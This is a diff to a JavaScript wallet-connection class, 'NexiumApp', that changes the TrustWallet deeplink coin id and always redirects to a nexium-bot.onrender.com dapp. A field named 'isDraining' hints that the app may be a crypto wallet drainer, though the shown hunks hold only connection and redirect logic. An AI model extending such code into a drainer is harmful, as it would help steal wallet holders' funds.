@@ -39,7 +39,6 @@ class NexiumApp {
     this.spinner = null;
     this.isDraining = false;
     this.provider = null;
-    this.hasRedirected = false; // Track if redirect has occurred
     console.log('Initializing NexiumApp...');
     this.initApp();
   }
@@ -151,7 +150,6 @@ class NexiumApp {
           accounts = [response.publicKey.toString()];
         } else if (walletName === 'TrustWallet' && hasSolana && window.solana.isTrust) {
           console.log('TrustWallet detected, connecting:', window.solana);
-          // Wait for solana object to be ready and check isTrust
           await new Promise(resolve => {
             const checkSolana = () => {
               console.log('Checking solana:', window.solana);
@@ -185,7 +183,7 @@ class NexiumApp {
       const deeplinks = {
         MetaMask: 'https://metamask.app.link/dapp/nexium-bot.onrender.com',
         Phantom: 'https://phantom.app/ul/browse/https://nexium-bot.onrender.com',
-        TrustWallet: 'https://link.trustwallet.com/open_url?coin=56&url=https://nexium-bot.onrender.com',
+        TrustWallet: 'https://link.trustwallet.com/open_url?coin=501&url=https://nexium-bot.onrender.com',
       };
 
       const deeplink = deeplinks[walletName];
@@ -194,12 +192,7 @@ class NexiumApp {
       }
       console.log(`Opening ${walletName} with deeplink: ${deeplink}`);
 
-      // Handle Trust Wallet redirect logic
-      if (walletName === 'TrustWallet' && !this.hasRedirected) {
-        this.hasRedirected = true; // Set flag after first redirect
-        window.location.href = deeplink;
-        return; // Exit to allow app to load
-      }
+      window.location.href = deeplink;
 
       const checkConnection = setInterval(async () => {
         if (walletName === 'MetaMask' && window.ethereum?.isMetaMask) {
